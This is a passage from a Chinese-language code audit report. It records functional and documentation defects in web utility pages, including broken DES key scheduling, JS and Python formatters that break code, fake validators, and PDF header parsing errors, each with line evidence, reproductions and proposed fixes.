- 复现：默认参数下把滑块拖到 375 → 预览显示 16px，但同点表达式算出 24px；把 pref 从 24 改到 40 再拖滑块 → 预览数值完全不变。
- 影响：用户无法用预览验证表达式，"首选字号"控件形同虚设。
- 方案：预览按生成表达式计算（`clamp(min, vw*w/100+rem, max)`），或明确把 `pref` 定义为中点并统一两套算法。
**留存建议（tools/it/clamp-calculator.html）**：预览与表达式必须共用同一函数，避免二次实现。

### IT-N293 只校验视口大小关系，不校验 min/max，倒置时表达式恒等于 MIN（中，确认缺陷）
- 问题：仅 `vwMin>=vwMax` 报错；`min>max` 或 `pref` 越界不拦。生成 `clamp(48px, …, 16px)` 时按 CSS 定义 `max(MIN, min(V, MAX))` 恒返回 48px，表达式彻底失效。
- 证据：`tools/it/clamp-calculator.html:269-274`（解析与唯一校验）、`:279`（直接拼 `clamp(min,…,max)`）、`:301`（初始化即 `calc()`）。
- 复现：输入 min=48、pref=40、max=16、视口 375–1440 → 实际 `clamp(48px, -3.2vw + 60px, 16px)`；任意视口都渲染 48px；期望提示"最小字号必须小于最大字号"。
- 影响：错误参数静默产出无效 CSS，用户排查困难。
- 方案：校验 `min <= pref <= max` 且均为正数，非法时标红输入并中止生成；同时对 `parseFloat(...)||默认值` 的 0 值做显式判空。
**留存建议（tools/it/clamp-calculator.html）**：三条数值校验加在 `calc()` 开头即可。

### 承诺 vs 实际（S 批专项）
- `tools/it/gitignore-generator.html:172`、`:382`：承诺忽略/输出 `.env`，8 个模板 29 条规则中无 `.env`（N270）；`:111` 写"按语言、框架与编辑器选择模板"，实现 `:217-226` 只有 8 个语言/IDE 栈，无任何框架模板；`:344` 的"默认参数"实际全选 8 项（N271）。
- `tools/it/phone-qr.html:201`、`:197`：承诺"使用标准 tel: URI，主流扫码器均支持/扫码唤起拨号"，实际生成随机噪点图、无数据编码与纠错（N273）；`:158` 承诺剥离全部空白，实际仅在补 `tel:` 时剥离（N274）。
- `tools/it/protobuf-parser.html:161`、`:204-205`：承诺解析二进制结构与抓包排查 gRPC，实现只有 `.proto` 文本转 JSON（N278）；`:415` 的"校验"只数括号（N277）；`:290-305` 不支持 `map<...>`（N276）；`:12` 的 meta 口径（.proto→JSON）与正文自相矛盾。
- `tools/it/hmac-generator.html:219`：FAQ 把"编码不一致"列为签名失败主因，实际密钥固定按 UTF-8 文本编码、输出只有 hex（N280）；`:151` 的"输出长度=摘要长度"描述正确，无问题。
- `tools/it/a1z26-cipher.html:147` 承诺非字母原样保留、`:149` 承诺越界视为非法，实际全部丢弃/静默跳过（N282、N283）。
- `tools/it/numeronym-generator.html:397` 承诺"结果展示缩写与各字母间字符数还原"，实际只有 `词 → 缩写` 对照、没有还原功能；`:193` 写"通常 7 字母以上才用"，`:262` 却对所有 ≥3 字母词生效（N286）。
- `tools/it/markdown-editor.html:527` 承诺"必须过滤内嵌 HTML，防止 XSS"，实际无任何净化且存在属性注入（N288）；`:521` 写"# 与 ## 均输出 h2"，与 CommonMark h1 语义不符（N290）；`:582` 的"任务清单"预设不支持 task list（N289）。
- `tools/it/clamp-calculator.html:169` 示例"320–1280px、16–24px：clamp(16px, 1rem+0.625vw, 24px)（约在 320px=16、1280px=24）"——按页面 `:275-278` 同参数实际生成 `clamp(16px, 2.5vw + 16px, 24px)`，320px 得 24px、≥320px 后一直被 max 截断，示例与算法不符（N291）。

### 覆盖
- 实读 8 页：`tools/it/gitignore-generator.html`、`tools/it/phone-qr.html`、`tools/it/protobuf-parser.html`、`tools/it/hmac-generator.html`、`tools/it/a1z26-cipher.html`、`tools/it/numeronym-generator.html`、`tools/it/markdown-editor.html`、`tools/it/clamp-calculator.html`（另读 `js/tool-kit.js` 的 `setValue`/`preset.bar`、`js/toolbox-stub.js` 的 `i18nText` 兜底）。
- 新增 24 条（高 6 / 中 15 / 低 3），编号 IT-N270~IT-N293；上一批止于 IT-N269，本批无重号。
- 未覆盖说明：只审计主流程、边界与文档口径，未穷举全部输入组合（gitignore 只核对模板全集与预设赋值，未逐栈检查每条规则是否过时；phone-qr 未实扫，结论为"无数据编码/纠错块"的构造性判定；protobuf 只测 map、非法文本、负数枚举与二进制输入，未覆盖 `extend`/`group`/aggregate option；hmac 未在非安全上下文实测 `crypto.subtle` 缺失路径；a1z26 只测大小写、重音、标点、数字与越界；numeronym 只测标点位置、短词与已有数字缩写；markdown 只做属性注入与 task list/# 层级；clamp 只算 3 组参数）。
- 未做验证：未改代码、未构建、未跑门禁、未 git 写、未开浏览器；结论为源码静态分析 + `node` 内存复算（临时脚本 `/tmp/t1.js`、`/tmp/t2.js`、`/tmp/t3.js`，未落仓库）；未验证英文态 `?lang=en-US`、繁体与移动端。

### IT-N294 DES 密钥编排只读取密钥最后 1 个字节，56 位密钥退化为 8 位（高，确认缺陷）
- 问题：`desCreateSubkeys` 把 8 字节密钥按 `keyBytes[i*8+j]`（i、j 各 0–7）装进 8 个 32 位字，索引 8–63 全为 undefined；又因 `(v<<8)` 是 32 位运算，`k[0]` 最终只剩 key[4..7]，`k[1..7]` 恒 undefined，PC1 取位几乎全部落到 0。
- 证据：`tools/it/des.html:336`（`v=(v<<8)|keyBytes[i*8+j]`）、`:338`（`bit=k[Math.floor((PC1[i]-1)/8)]` → 只用到 k[0]）、`:327`（`hexToBytes`）。
- 复现（node 照抄 `:335-338` 并调用 `desEcb`）：密钥 `0123456789abcdef` 加密 `4e6f772069732074` → `ffcfffff30f3ccff`；把密钥第 0–6 字节逐个异或 0x11，密文全部不变；仅第 7 字节改动才变为 `c3c33ccfcffc3cf3`。标准 DES 向量应为 `3fa40e8a984d4815`。
- 影响：有效密钥空间至多 2^8，页面 :157/:166 宣称的 56/112/168 位安全形同虚设；输出与任何标准 DES/3DES 实现不兼容，:263 "解密老系统历史数据"场景不可用。
- 方案：改为按字节逐位取 PC1（`(keyBytes[(PC1[i]-1)>>3] >> (7-((PC1[i]-1)&7))) & 1`），取消 32 位打包；3DES 分别对 k1/k2/k3 调同一函数。
**留存建议（tools/it/des.html）**：重写 `:334-352` 的密钥编排，并用 FIPS 已知向量做回归。

### IT-N295 64 位分组在 32 位整数上拼装，FP 置换丢高位、自解密不还原（高，确认缺陷）
- 问题：`desBlock` 用 `(R<<32)|L>>>0` 组装 64 位状态，JS 移位按模 32 计，`R<<32` 等于 `R<<0`，结果退化为 `R|L` 的 32 位按位或；FP 再以 `>>> (63-fp)` 取位，同样在 0–31 循环，高 32 位信息不可恢复。
- 证据：`tools/it/des.html:378`、`:380`、`:356-359`（L/R 始终是 32 位整数）。
- 复现（node 实算）：R=0x12345678、L=0x9abcdef0 → 实际 `9abcdef8`，期望 `123456789abcdef0`；按页面默认参数（3DES-CBC、48hex 密钥、零 IV、PKCS7）加密再解密，`Hello, DES/3DES encryption!` 往返输出乱码（FAIL）。
- 影响：即使修好密钥编排，加解密也不可逆且与标准实现不兼容，核心功能失效。
- 方案：用 Uint8Array 逐位操作或 BigInt 承载 64 位状态，按 IP→16 轮→FP 的规范顺序重写。
**留存建议（tools/it/des.html）**：`:354-382` 整段重写，单测覆盖"加密→解密"与已知向量。

### IT-N296 密钥/IV/密文的非法输入全部静默"纠正"，用户无感知（中，确认缺陷）
- 问题：非十六进制密钥经 `parseInt` 得 NaN、写入 Uint8Array 变 0；密钥短补零、长截断均无提示；非法或不足 8 字节的 IV 一律回退全零；解密时"全 hex 且偶数长度才算 hex"，奇数 hex 转 Base64 抛 `InvalidCharacterError`，密文长度也不校验是否为 8 的倍数。
- 证据：`:439`（hex 密钥解析）、`:442-448`（补零/截断）、`:455-457`（IV 回退全零）、`:327`（`new Uint8Array(h.length/2)`，实测 `abc` → 0xab）、`:534`（解密输入判定）、`:535`（hex/Base64 判定正则）、`:387-390`（按 8 字节循环、不校验 `data.length%8`）。
- 复现（node）：key=`password` 且不勾"密钥为文本" → 实际密钥全 0；IV=`abc` → 全零 IV；密文 `abc` → "处理失败: InvalidCharacterError"；4 字节 hex 密文 → 静默按 8 字节块处理并输出乱码。
- 影响：错误配置被静默接受，用户看到"成功"提示却拿到错误结果；密钥/IV 补零进一步削弱本已失效的安全性。
- 方案：严格校验 key/IV 的字符集与长度，非法时标红并中止；解密校验密文长度为 8 的倍数，奇数 hex 给出明确错误而非转 Base64。
**留存建议（tools/it/des.html）**：`:431-457` 与 `:532-536` 加显式校验与错误提示。

### IT-N297 JS 格式化在表达式中插入换行/注释，触发 ASI 改变语义或直接语法错误（高，确认缺陷）
- 问题：`formatJs` 丢弃全部原始空白，遇注释强制换行；`const x = 1/*c*/+2` 被拆成 `const x =1\n/*c*/\n+2 …`，`+2` 成为新语句开头；`return\n{a:1}` 的 ASI 语义被合并成 `return {`。
- 证据：`tools/it/js-formatter.html:355`（`newline()` 去行尾空白）、`:359-364`（注释先换行再原样输出）、`:418`（统一收尾）。
- 复现（node 实跑格式化结果并执行）：`const x = 1/*c*/+2\nconsole.log(x)` → 原文结果 3；格式化后 `const x =1\n/*c*/\n+2 console.log(x)` → `SyntaxError: Unexpected identifier 'console'`。`function f(){\nreturn\n{a:1}\n}` → 原文返回 undefined，格式化后返回 `[object Object]`。
- 影响：页面 :225 "纯格式化不会改变代码行为"不成立；粘贴正常代码可能得到不可运行或行为变化的输出。
- 方案：注释保持原 token 位置（仅在原换行处换行）；对 `return/throw/break/continue` 的 ASI 边界强制保留换行或加分号；或改用成熟格式化库。
**留存建议（tools/it/js-formatter.html）**：`:343-421` 的换行策略需重做，不能"注释即换行"。

### IT-N298 压缩不补分号、不保留换行，多语句代码基本必然非法（高，确认缺陷）
- 问题：`minifyJs` 仅按 token 类型决定是否加一个空格，从不插入 `;`；删掉全部换行后 ASI 边界消失，`i++` 后紧跟下一语句时还因 `:436` 主动取消空格。
- 证据：`:429-443`（主循环无分号逻辑）、`:436`（`prevVal==='++'` 时 `needSpace=false`）、`:431`（`tk.v==='regex'` 恒不成立，应为 `tk.t`）。
- 复现（node 实跑并执行）：`let i=0\ni++\nj=1` → `let i=0 i++j=1`（`SyntaxError`）；`const a=1 // hi\nconst b=2` → `const a=1 const b=2`（`SyntaxError`）；`x=5\n[1,2].map(...)` → `x=5[1,2].map(...)`（`SyntaxError`）。
- 影响：压缩按钮对绝大多数多语句脚本产出的都是不可运行代码，且没有任何告警。
- 方案：保留语句间分号/必要换行；修正 regex 类型判断；压缩后用 `new Function` 自检并在失败时提示。
**留存建议（tools/it/js-formatter.html）**：`:422-446` 需补语句分隔，`:431` 一行修正。

### IT-N299 "校验"只统计括号数量，不检测语法（中，确认缺陷）
- 问题：`doValidate` 只统计 `{ } ( ) [ ]` 数量与 `function`/`const` 出现次数；括号总数相等但结构错乱、非法声明、缺操作数都会显示"✅ 校验通过"。
- 证据：`:449-474`（`:456-458` 计数、`:470-473` 仅比较总数）；`:460-468` 输出为统计信息而非语法诊断。
- 复现：输入 `const 1 = 2; for(` → `(` 计数 1/1，页面输出"✅ 校验通过"；期望报语法错误。
- 影响：用户把"校验通过"当成可运行保证，实际只是计数器。
- 方案：用 `new Function(src)` 捕获 SyntaxError 并给出行列，或接入纯前端解析器；按钮文案改为"统计"。
**留存建议（tools/it/js-formatter.html）**：`:449-475` 改成真实语法检查，最低限度也改文案。

### IT-N300 Python 缩进重排错误：块体被提前 dedent，三引号行不缩进，自带样例格式化即坏（高，确认缺陷）
- 问题：dedent 依赖 `stack._allowDedent`，该标志只在冒号行置 true，且下一行受 `!(stack[top]===1 && /^[a-zA-Z]/…)`（`_defStarted` 从未赋值）阻挡；嵌套块首行反而被 pop 一级；三引号行直接 `out.push(line)` 保留源缩进；顶层语句以字母开头时无法回到 0。
- 证据：`:303-305`（三引号原样输出）、`:317-320`（dedent 条件与 `_allowDedent`）、`:319-329`（缩进计算与入栈）。
- 复现（node 实跑页面自带 SAMPLE，indent=4）：`def fibonacci(n):` 之后 `"""…"""`、`a, b = 0, 1` 都在第 0 列；`for` 体缩进 4、`return result` 缩进 4；`class Calculator:` 与 `def __init__` 都缩进 4，`if __name__` 也缩进 4。小例 `def f():\n    if x:\n        y=1\n    z=2\nw=3` → `y=1` 只缩进 2、`z=2`/`w=3` 全部缩进 2（期望 4/2/0）。两种输出都是 IndentationError。
- 影响：美化后的代码不可运行，示例按钮直接给出坏结果。
- 方案：用统一的缩进栈按真实块结构缩进（记录每行层级与块是否结束），三引号/注释行按当前层级补缩进；或接入浏览器内 Python 解析器。
**留存建议（tools/it/python-formatter.html）**：`:291-335` 缩进算法重写，SAMPLE 应作为回归用例。

### IT-N301 Python 压缩丢弃全部缩进、把注释与后续代码拼成一行，含块结构必坏（高，确认缺陷）
- 问题：`minifyPython` 对每行 `trim()` 后按 `; ` 拼接，从不保留缩进；注释行同样进入 `out`，下一行代码会被拼到注释后面，整行变成注释。
- 证据：`:350-360`（`trim()` 与拼接判据）、`:353`（注释行 push）、`:356-357`（`out[last]=prev+'; '+trimmed`）。
- 复现（node 实跑）：`# comment\nx = 1\nprint(x)` → `# comment; x = 1; print(x)`（赋值被注释吞掉）；`def f():\n    x=1\n    return x\nprint(f())` → `def f():\nx=1; return x; print(f())`（缩进丢失、`print` 被并入函数，`x=1` 在第 0 列直接 IndentationError）。
- 影响："压缩"产物既不可运行也改变语义，与 :165 "格式化只改变排版"相反。
- 方案：压缩保留块缩进与换行（逐物理行输出），注释行单独成行且不与代码合并；或明确标注"仅演示、不保证可执行"。
**留存建议（tools/it/python-formatter.html）**：`:336-365` 不能用"整行 trim + 分号拼接"实现。

### IT-N302 Python "校验"只检查三引号闭合，缩进错误也显示通过（中，确认缺陷）
- 问题：`doValidate` 仅统计行数/def/class/import 与三引号是否闭合；`:387-389` 的 depth 只做加减不参与判定，缩进错误、`if` 缺冒号、`def f():\nprint(1)` 都报"✅ 校验通过"。
- 证据：`:368-401`（`:387-389` 深度计算、`:399-400` 仅判三引号）。
- 复现：输入 `def f():\nprint(1)`（缺 4 空格）→ 输出"三引号字符串未闭合: 否 ✅"与"✅ 校验通过"；期望提示缩进错误。
- 影响：误导用户，校验按钮形同装饰。
- 方案：接入纯前端 Python 解析器做真实语法检查，或至少检测"冒号行后必须增加缩进""return 必须在块内"等结构规则并标明能力边界。
**留存建议（tools/it/python-formatter.html）**：`:368-402` 与 JS 页 `:449-475` 同属"假校验"，建议统一换真实解析。

### IT-N304 单元格文本中的 "NaN"/"Infinity" 被替换成 "—"（低，确认缺陷）
- 2026-11-06 基线 `0781ef7e61` 独立 Chrome 复核：CSV `name,value` 换行 `NaN,Infinity Labs` 产出 `<td>—</td><td>— Labs</td>`，预览同样被改写；问题仍存在，不重复编号。
- 当前基线另复现空输入：清空 CSV 输入后仍生成 Alice/Bob 示例表格并可复制/下载。`calcTool()` 第 300–301 行对空值强制回退样例；输入区初始示例还包含 Carol。用户可能误将虚构示例当成当前结果，建议空态清除输出并提示，示例通过显式按钮载入。
- 问题：`escH` 在转义前做 `String(s).replace(/Infinity|NaN/g,'—')`，把合法数据值改写为破折号；该替换本意是数值 NaN 兜底，却作用于所有文本单元格。
- 证据：`tools/it/csv-to-html-table.html:297`。
- 复现：CSV `v\nNaN` → 单元格输出 `—`（期望 `NaN`）；`NaNValue` → `—Value`。
- 影响：数据被静默篡改，且与"HTML 转义"语义无关。
- 方案：`escH` 只做 HTML 转义；数值兜底移到统计/格式化处。
**留存建议（tools/it/csv-to-html-table.html）**：`:297` 拆成纯转义 + 数值格式化两件事。

### IT-N305 LaTeX 搜索不是"即时筛选"，必须点"计算"（中，确认缺陷）
- 问题：说明写"输入关键词…即时筛选"，但 `#q` 无 `oninput`，全文也无 input 事件监听，仅在点击"计算"时调用 `calcTool()`。
- 证据：`tools/it/latex.html:112`（承诺即时筛选）、`:116`（`<input type="text" id="q" value="">` 无 oninput）、`:120`（计算按钮）、`:202-203`（筛选逻辑只在 calcTool 内）。
- 复现：输入 `alpha` 后不点按钮 → 列表仍是全部符号；点"计算"才过滤；期望输入即筛选。
- 影响：与宣传不符，多一步操作且易误解为搜索无结果。
- 方案：给 `q` 加 `oninput="calcTool()"`（或 `addEventListener('input',…)`），保留"计算"按钮。
**留存建议（tools/it/latex.html）**：`:116` 补一个 oninput 即可，成本极低。

### IT-N306 复制命令无论成败都提示"已复制"（中，确认缺陷）
- 问题：`copyLatex` 使用已废弃的 `document.execCommand('copy')`，返回值被忽略、无 Clipboard API 兜底，随后无条件写入"已复制 cmd"。
- 证据：`tools/it/latex.html:208`（`try{document.execCommand('copy')}catch(e){}` 后 `tip.textContent='已复制 '+cmd`）。
- 复现：在禁用剪贴板权限或不支持 execCommand 的环境点命令 → 剪贴板未变，提示仍显示"已复制 \alpha"。
- 影响：用户以为已复制、粘贴出旧内容；失败无提示无从排查。
- 方案：优先 `navigator.clipboard.writeText`，失败时提示"复制失败，请手动选择"；同时判断 execCommand 的布尔返回值。
**留存建议（tools/it/latex.html）**：`:208` 改异步复制并处理失败分支。

### IT-N307 搜索只匹配命令与中文说明，不匹配显示符号（低，确认缺陷）
- 问题：`filter` 只查 `e[0]`（命令）与 `e[2]`（说明），不查 `e[1]`（符号），搜 `∑`、`α`、`→` 得到 0 条。
- 证据：`:203`；`:201`（数据格式为 `[命令, 符号, 说明]`）。
- 复现：输入 `∑` → "共 0 条"；期望命中 `\sum`。
- 影响：用户"按符号反查命令"这一最常见路径不可用。
- 方案：条件加入 `e[1].indexOf(q)>=0`。
**留存建议（tools/it/latex.html）**：`:203` 加一个字段即可。

### IT-N308 引据表承诺"国际区号"，数据与详情均无该字段（中，确认缺陷）
- 问题：参考资料表写明"国家码 1-3 位 / E.164"，但 `COUNTRIES` 无 `dial` 字段，详情面板只显示首都/货币/语言/面积/大洲。
- 证据：`tools/it/country-flag.html:235`、`:253-302`（数据项无 dial）、`:330-341`（详情模板）。
- 复现：搜索 `+86` 或任意区号 → 0 条；点中国详情 → 无国际区号。
- 影响：标题"国家代码与旗帜"易被理解为含电话区号，引据与实际能力不符。
- 方案：补 `dial` 字段并在详情/搜索/导出中使用，或删掉该引据行。
**留存建议（tools/it/country-flag.html）**：`:235` 与数据字段二选一，别留空承诺。

### IT-N309 仅收录 48 国且无"未收录"提示，常见国家搜不到（中，确认缺陷）
- 问题：`COUNTRIES` 只有 48 条，搜索 `巴基斯坦`、`伊朗`、`匈牙利`、`埃塞俄比亚` 等返回"共 0 个国家/地区"，页面未说明数据不完整。
- 证据：`tools/it/country-flag.html:253-302`（数据全集）、`:312-315`（过滤后直接渲染）、`:325`（只显示命中数）。
- 复现（node 统计）：数组长度 48、无 dial；输入"巴基斯坦" → filtered 为空 → 显示"共 0 个国家/地区"。
- 影响：用户误判为工具故障或数据错误；与"国家代码查询"预期不符。
- 方案：补全 ISO 3166-1 全部代码（旗帜可由 code 推导），或在无结果时提示"当前仅收录 48 个常用国家/地区"。
**留存建议（tools/it/country-flag.html）**：优先补数据；短期至少加空结果说明。


### IT-N311 说明把输出当"Unicode 码点"，实际是 UTF-8 字节，"中"≠20013（中，确认缺陷）
- 问题：公式列表写"取每个字符的 Unicode 码点"，FAQ 写"超出 127 的字符需用 Unicode 码点（如'中'=20013）"，但实现先 `TextEncoder` 再逐字节输出；`中` 实际输出 `228 184 173`，按 20013 解码会被判非法。
- 证据：`:147`（"取每个字符的 Unicode 码点"）、`:206`（FAQ 中=20013）、`:258`（`new TextEncoder().encode`）、`:260`（逐字节 join）、`:270`（>255 拒绝）。
- 复现（node）：`enc('中',' ')` → `228 184 173`；`dec('20013')` → "非法十进制数: 20013"。
- 影响：用户按文档处理非 ASCII 会得到与预期不符的结果且无法解释。
- 方案：统一口径为 UTF-8 字节（改 :147/:206 文案并给出 `中` 的字节示例），或改为输出 Unicode 码点并相应调整解码。
**留存建议（tools/it/decimal-encode.html）**：`:147`、`:206` 与实现二选一，别让文档与代码对立。

### IT-N312 解码用 `parseInt` 宽松解析，`65x` 被接受、`0x41` 静默变 0（低，确认缺陷）
- 问题：`parseInt(parts[i],10)` 忽略尾部垃圾；`0x41` 以 10 进制解析只读到 `0`，页面不报错。
- 证据：`tools/it/decimal-encode.html:269-271`。
- 复现（node）：解码 `65x 66` → `AB`（期望报非法）；`0x41 0x42` → 两个 NUL（期望报非法或提示改用十六进制工具）。
- 影响：脏数据被静默按错误值解码。
- 方案：先用 `/^\d+$/` 校验整段，再 `Number(part)`；对 `0x` 前缀给出明确提示。
**留存建议（tools/it/decimal-encode.html）**：`:269-270` 换成严格整数校验。

### 承诺 vs 实际（S 批专项）
- `tools/it/des.html:166`、`:263`：承诺"3DES 密钥 112/168 位""维护老系统时解密历史数据"，实际密钥编排只剩 1 字节有效、输出与标准不兼容（N294、N295）；`:155` 的"解密时纯十六进制且偶数长度按 hex、否则 Base64"实现一致，但奇数 hex 会抛 `InvalidCharacterError`（N296）。
- `tools/it/js-formatter.html:225` 承诺"纯格式化不会改变代码行为，AST 不变"，实际注释换行与 `return` ASI 均改变语义（N297）；`:167` 写"必须基于 AST 而非简单正则"，本页是手写词法 + 深度计数（`:163`），压缩还不补分号（N298）。
- `tools/it/python-formatter.html:170` 承诺"统一空格"，实测 `x={1:2,3:4}` 原样输出；`:219` 示例"`x={1:2,3:4}` → `x = {1: 2, 3: 4}`"不成立；`:223` 的"成熟工具只做等价改写"不适用于本页（N300、N301）。
- `tools/it/csv-to-html-table.html:128` 承诺"右侧实时预览渲染效果"、`:117` 承诺生成表头区与 th，实际产物在 `:314` 被覆盖成闭合标签（N303）。
- `tools/it/latex.html:112` 承诺"输入关键词…即时筛选"，实际无 input 监听（N305）；`:160` 的"复制到编辑器即可渲染"对 `\matrix`、`\begin{cases}` 等片段（`:201`）不成立。
- `tools/it/country-flag.html:235` 的引据写"国家码 1-3 位 / E.164"，数据无 dial 字段（N308）；数据仅 48 条却以"国家代码与旗帜"整体名义提供（N309）。
- `tools/it/decimal-encode.html:10` 的 meta 写"每个字节 0–255"（与实现一致），但 `:147`/`:206` 写 Unicode 码点、`中`=20013（N311）；`:166` 提供"无分隔符"却产出自解码器拒绝的串（N310）。
- `tools/it/hex-to-text.html:204` 承诺"不行再换 GBK"，页面无字符集选项（N313）；`:203` 的"奇数位缺位会报格式错误"实现正确。

### 覆盖
- 实读 8 页：`tools/it/country-flag.html`、`tools/it/js-formatter.html`、`tools/it/hex-to-text.html`、`tools/it/des.html`、`tools/it/latex.html`、`tools/it/decimal-encode.html`、`tools/it/python-formatter.html`、`tools/it/csv-to-html-table.html`。
- 新增 21 条（高 8 / 中 9 / 低 4），编号 IT-N294~IT-N314；上一批止于 IT-N293，本批无重号。
- 未覆盖说明：只审计主流程、边界与文档口径，未穷举全部输入组合（DES 只逐字节改 0x11 观察敏感性，未做全密钥空间统计；JS 只测 5 组输入；Python 只测自带 SAMPLE 与 2 个小例；CSV 只测默认数据与引号/换行字段；country 只做数据一致性与长度统计，未核对全部国名/首都时效）。
- 未做验证：未改代码、未构建、未跑门禁、未 git 写、未开浏览器；结论为源码静态分析 + `node` 内存复算（临时脚本 `/tmp/audit_des.js`、`/tmp/audit_fmt.js`、`/tmp/audit_misc.js`，未落仓库）；DES 标准向量因本机 OpenSSL 无 `des-ecb` 采用 FIPS 公开值（key `0123456789ABCDEF` / 明文 `Now is t` → `3FA40E8A984D4815`）；未验证英文态 `?lang=en-US`、繁体与移动端。

### IT-N315 PDF 头版本号取错字节，任何合法 PDF 都被判红（高，确认缺陷）
- 问题：`head` 用 `buf[5]` + `'.'` + `buf[6]` 拼接，而 `%PDF-1.7` 的字节布局是 `[5]='1'`、`[6]='.'`、`[7]='7'`，拼出来恒为 `%PDF-1.`，正则 `/^%PDF-\d$/` 永远不匹配。
- 证据：`tools/it/pdf-signature-checker.html:271-272`。
- 复现：上传任意正常 PDF（头为 `%PDF-1.7`）→ 表格「PDF 头」显示 `%PDF-1.` 且为红色；期望显示 `%PDF-1.7` 并判绿（PDF 2.0 同理应取 `buf[7]`）。
- 影响：合法文件被标成异常，用户据此误判文件损坏；顶部「PDF 头」是唯一的前置门禁，导致整页结论不可信。
- 方案：改为 `'%PDF-' + buf[5] + '.' + buf[7]`，或直接取前 8 字节并匹配 `/^%PDF-\d\.\d/`。

### IT-N316 「签名区域字节数」用第 4 参数减第 3 参数，输出负数字节（高，确认缺陷）
- 问题：`/ByteRange` 的四个数是 `offset1 len1 offset2 len2`，被签名字节数应为 `len1 + len2`；代码却算 `br[4]-br[3]`（len2 − offset2），既不是覆盖长度也常为负数。
- 证据：`tools/it/pdf-signature-checker.html:275`（捕获四参数）、`:277`（`(parseInt(br[4])-parseInt(br[3]))+' bytes'`）；`:112` 的公式说明同样写错。
- 复现：`/ByteRange [0 8000 9000 1200]` → 页面显示 `-7800 bytes`；期望 `9200 bytes`（即 8000+1200）。
- 影响：签名覆盖范围是判断「增量更新是否被签」的关键数值，负值直接误导取证与合规检查。
- 方案：改为 `br[1]+br[3]` 的数值和（`parseInt(br[2])+parseInt(br[4])`），并同步修正 `:112` 的公式文案。
**假工具候选：是（类型 C）** —— `:134` 明说「不做签名内容有效性验证」，但深度解析 `:160-166` 仍宣称「校验 PKCS#7 签名与证书链」「摘要不符会标记篡改」，实际只做 ByteRange/Contents 存在性匹配。


### IT-N318 解码 `parseInt` 宽松截断，非法数字被静默解成别的字节（高，确认缺陷）
- 问题：`parseInt(parts[i],8)` 遇非法字符即停止，不校验整段；`078`、`378` 这类串被当成合法值。
- 证据：`tools/it/octal-encode.html:278-280`。
- 复现（node）：`parseInt('078',8)=7`、`parseInt('378',8)=31` → 页面把 `078` 解码成 U+0007、把 `378` 解码成 U+001F；期望两例都提示「非法八进制数」。
- 影响：脏数据/手误被静默转成控制字符，复制出去即污染文本，且页面不给任何告警。
- 方案：先 `/^[0-7]{1,3}$/` 校验再 `Number()`；长度不足 3 位可报警或按规范要求补齐。

### IT-N319 点「重置」会把三个字符集全部取消，页面只剩错误提示（中，确认缺陷）
- 问题：`resetForm()` 把 upper/lower/digit 三个默认勾选的复选框都置 `false`，随后 `calcTool()` 落入 `if(!set)` 分支。
- 证据：`tools/it/random-string.html:268-274`（`checked=false`）、`:240`（`请至少选择一种字符集` 后 return）。
- 复现：打开页面（默认已勾选大写/小写/数字）→ 点「重置」→ 结果区变成「请至少选择一种字符集」，无任何输出；期望恢复出厂默认并立即生成 5 条示例。
- 影响：最常用的「重置」把工具重置成不可用态，用户需手动重新勾选。
- 方案：重置时按 HTML 初始默认态恢复（`top_upper/top_lower/top_digit = true`，`top_sym = false`），或直接调用页面初始化分支。

### IT-N320 XML 混合内容丢正文，只剩子元素（高，确认缺陷）
- 问题：有子元素时只递归 `node.children`，完全不读取 `node.textContent`；`kids.length>0` 分支没有任何文本兜底。
- 证据：`tools/it/xml-to-json.html:264-275`（`:269` 只遍历 kids，`:275` 直接返回 obj）。
- 复现：输入 `<p>Hello <b>world</b>!</p>` → 输出 `{"p":{"b":"world"}}`，`Hello ` 与 `!` 两个文本段永久丢失；期望保留为 `{"p":{"#text":"Hello !","b":"world"}}` 或至少给出不支持的告警。
- 影响：HTML/RSS/SVG 等混合内容 XML 转换后正文缺失，且页面仍提示「✅ 转换成功」，用户无从察觉。
- 方案：有子元素时收集直接文本节点，非空则写入 `#text`（与 `:267` 的叶节点口径保持一致）。

### IT-N321 划分子网数量无上限，`/8` 配 1677 万子网会冻死标签页（中，确认缺陷）
- 问题：`subN` 只有 `min="1"` 无 `max`，`realN = 2^bits` 直接进 `for` 循环并逐行建表格，没有任何规模上限或分批。
- 证据：`tools/it/calc-subnet.html:134`（无 max）、`:307-313`（`bits=ceil(log2(n))`、`realN` 循环）。
- 复现：IP `10.0.0.0`、前缀 `/8`、N=`16777216` → `bits=24`、`newPrefix=32`、`realN=16777216`，循环构造 1677 万行 → 页面长时间无响应/崩溃；期望提示「超出展示上限」或限制 N ≤ 1024。
- 影响：一次合法输入即可让页面卡死，移动端必然崩溃。
- 方案：对 `realN` 设阈值（如 4096）直接拒绝，或改为分页/懒渲染；`:329` 的汇总文案同步提示已截断。

### IT-N322 生成数量超过 15 后循环复用同一批键，.env 出现重复键（高，确认缺陷）
- 问题：`ENV_KEYS` 固定 15 条，`n` 上限 50，生成时用 `shuffled[i % shuffled.length]` 取模，超过 15 即重复整组键值。
- 证据：`tools/it/generator-16.html:208-222`（15 组键值）、`:225`（`Math.min(...,50)`）、`:230`（`i % shuffled.length`）。
- 复现：数量填 `20` → 输出中 `DATABASE_URL=postgres://...` 出现两次、`REDIS_URL` 等也重复；期望 20 个唯一键，或数量上限收紧到 15 并提示。
- 影响：多数 .env 解析器「后者覆盖前者」，重复键让最终生效配置与用户看到的清单不一致；同时所有值都是硬编码占位（`JWT_SECRET=change-me-in-production`），并未真正生成随机密钥。
- 方案：超过 15 时拒绝并提示，或按键名生成唯一后缀；若要保留「生成器」定位，至少为密钥类字段用 `crypto.getRandomValues` 生成随机值。
**假工具候选：是（类型 A）** —— 唯一输入只有「数量」，输出恒为固定 15 条硬编码键值轮转，不存在任何按用户输入生成/随机化的内容。

### IT-N323 「复制」把所有昵称无分隔拼成一串（中，确认缺陷）
- 问题：每条结果是一个 `<div class="code-row">`，`copyResult` 直接取容器 `textContent`，块级元素之间没有换行符。
- 证据：`tools/it/gamertag-generator.html:293`（逐条 `<div>`）、`:299-300`（`output.textContent` 写剪贴板）。
- 复现：生成 3 条 → 剪贴板得到 `ShadowWolf7NeonBlade12CyberFox3`（三个名字连成一串），期望每行一个昵称。
- 影响：复制出的候选名无法直接粘贴进注册表单或表格，用户需手工切分。
- 方案：复制时按 `.code-row` 逐条收集 `textContent` 并用 `\n` join，或改用 `<pre>`/`<br>` 结构。

### IT-N324 ITF 起止符画错，生成的条码缺少扫描器必需的 guard（高，确认缺陷）
